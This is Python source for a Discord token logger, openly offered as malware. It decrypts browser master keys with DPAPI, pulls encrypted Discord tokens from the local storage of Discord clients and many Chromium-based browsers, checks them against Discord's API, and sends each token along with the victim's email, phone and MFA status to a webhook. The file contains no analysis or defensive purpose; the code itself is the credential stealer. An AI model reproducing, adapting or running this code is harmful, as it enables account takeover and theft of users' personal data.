# Token Logger - Deadconvicess
# Github - https://github.com/deadconvicess/Discord-Token-Logger



# Logger 
def get_master_key(path):
    try:
        with open(path, 'r') as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        print(f"")
        return None
def extract_tokens(path, key):
    tokens = []
    token_pattern = re.compile(r'dQw4w9WgXcQ:[^"\'\']+')
    if not os.path.exists(path):
        return tokens
    for filename in os.listdir(path):
        if filename.endswith(".ldb") or filename.endswith(".log"):
            try:
                with open(os.path.join(path, filename), errors="ignore") as f:
                    for line in f:
                        for enc in token_pattern.findall(line):
                            enc_token = base64.b64decode(enc.split(":")[1])
                            iv = enc_token[3:15]
                            payload = enc_token[15:]
                            cipher = AES.new(key, AES.MODE_GCM, iv)
                            token = decrypt_payload(cipher, payload)
                            if token and token not in tokens:
                                tokens.append(token)
            except Exception as e:
                print(f"{filename}: {e}")
    return tokens
def Discord_tokens():
    targets = {
    "Discord": os.path.expandvars("%APPDATA%\\Discord"),
    "Discord Canary": os.path.expandvars("%APPDATA%\\discordcanary"),
    "Discord PTB": os.path.expandvars("%APPDATA%\\discordptb"),
    "Lightcord": os.path.expandvars("%APPDATA%\\Lightcord"),
    "Ripcord": os.path.expandvars("%APPDATA%\\Ripcord"),
    "Chrome Default": os.path.expandvars("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default"),
    "Chrome Profile 1": os.path.expandvars("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Profile 1"),
    "Chrome Profile 2": os.path.expandvars("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Profile 2"),
    "Chrome Profile 3": os.path.expandvars("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Profile 3"),
    "Chrome System": os.path.expandvars("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\System Profile"),
    "Brave Default": os.path.expandvars("%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\Default"),
    "Brave Profile 1": os.path.expandvars("%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1"),
    "Brave Profile 2": os.path.expandvars("%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2"),
    "Brave Profile 3": os.path.expandvars("%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3"),
    "Brave System": os.path.expandvars("%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\System Profile"),
    "Opera Stable": os.path.expandvars("%APPDATA%\\Opera Software\\Opera Stable"),
    "Opera GX Stable": os.path.expandvars("%APPDATA%\\Opera Software\\Opera GX Stable"),
    "Opera Next": os.path.expandvars("%APPDATA%\\Opera Software\\Opera Next"),
    "Opera Developer": os.path.expandvars("%APPDATA%\\Opera Software\\Opera Developer"),
    "Opera Portable": os.path.expandvars("%USERPROFILE%\\Downloads\\OperaPortable\\Data\\profile"),
    "Edge Default": os.path.expandvars("%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default"),
    "Edge Profile 1": os.path.expandvars("%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Profile 1"),
    "Edge Profile 2": os.path.expandvars("%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Profile 2"),
    "Edge Profile 3": os.path.expandvars("%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Profile 3"),
    "Edge System": os.path.expandvars("%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\System Profile"),
    "Vivaldi Default": os.path.expandvars("%LOCALAPPDATA%\\Vivaldi\\User Data\\Default"),
    "Vivaldi Profile 1": os.path.expandvars("%LOCALAPPDATA%\\Vivaldi\\User Data\\Profile 1"),
    "Vivaldi Profile 2": os.path.expandvars("%LOCALAPPDATA%\\Vivaldi\\User Data\\Profile 2"),
    "Vivaldi Profile 3": os.path.expandvars("%LOCALAPPDATA%\\Vivaldi\\User Data\\Profile 3"),
    "Vivaldi System": os.path.expandvars("%LOCALAPPDATA%\\Vivaldi\\User Data\\System Profile"),
    "Yandex Default": os.path.expandvars("%LOCALAPPDATA%\\Yandex\\YandexBrowser\\User Data\\Default"),
    "Yandex Profile 1": os.path.expandvars("%LOCALAPPDATA%\\Yandex\\YandexBrowser\\User Data\\Profile 1"),
    "Yandex Profile 2": os.path.expandvars("%LOCALAPPDATA%\\Yandex\\YandexBrowser\\User Data\\Profile 2"),
    "Yandex Profile 3": os.path.expandvars("%LOCALAPPDATA%\\Yandex\\YandexBrowser\\User Data\\Profile 3"),
    "Yandex System": os.path.expandvars("%LOCALAPPDATA%\\Yandex\\YandexBrowser\\User Data\\System Profile"),
    "Chromium Default": os.path.expandvars("%LOCALAPPDATA%\\Chromium\\User Data\\Default"),
    "Chromium Profile 1": os.path.expandvars("%LOCALAPPDATA%\\Chromium\\User Data\\Profile 1"),
    "Chromium Profile 2": os.path.expandvars("%LOCALAPPDATA%\\Chromium\\User Data\\Profile 2"),
    "Chromium Profile 3": os.path.expandvars("%LOCALAPPDATA%\\Chromium\\User Data\\Profile 3"),
    "Chromium System": os.path.expandvars("%LOCALAPPDATA%\\Chromium\\User Data\\System Profile"),
    "Firefox Profiles": os.path.expandvars("%APPDATA%\\Mozilla\\Firefox\\Profiles"),
}
    found_tokens = []
    for name, path in targets.items():
        local_state_path = os.path.join(path, "Local State")
        key = get_master_key(local_state_path)
        if not key:
            continue
        leveldb = os.path.join(path, "Local Storage", "leveldb")
        tokens = extract_tokens(leveldb, key)
        found_tokens.extend(tokens)
    for token in found_tokens:
        try:
            res = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token})
            if res.status_code == 200:
                user = res.json()
                uid = base64.b64decode(token.split('.')[0] + '==').decode('utf-8', 'ignore')
                info = (
                    f"**Token**: `{token}`\n"
                    f"**User ID**: `{uid}`\n"
                    f"**Username**: {user['username']}#{user['discriminator']}\n"
                    f"**ID**: {user['id']}\n"
                    f"**Email**: {user.get('email', 'None')}\n"
                    f"**Phone**: {user.get('phone', 'None')}\n"
                    f"**MFA Enabled**: {user.get('mfa_enabled', False)}"
                )
                send_webhook(info, title=f"Token Logged", encrypt=False)
        except Exception as e:
            print(f"{e}")